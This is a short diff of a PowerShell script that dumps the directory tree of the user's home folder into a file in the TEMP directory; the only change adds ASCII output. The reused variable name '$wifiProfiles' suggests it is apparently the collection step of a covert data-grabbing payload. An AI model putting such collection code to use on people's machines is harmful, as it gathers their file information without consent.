@@ -1,6 +1,6 @@
 ############################################################################################################################################################
 
-$wifiProfiles = (tree $HOME) | Out-String
+$wifiProfiles = (tree $HOME /a) | Out-String
 
 
 $wifiProfiles > $env:TEMP/--folder-tree.txt
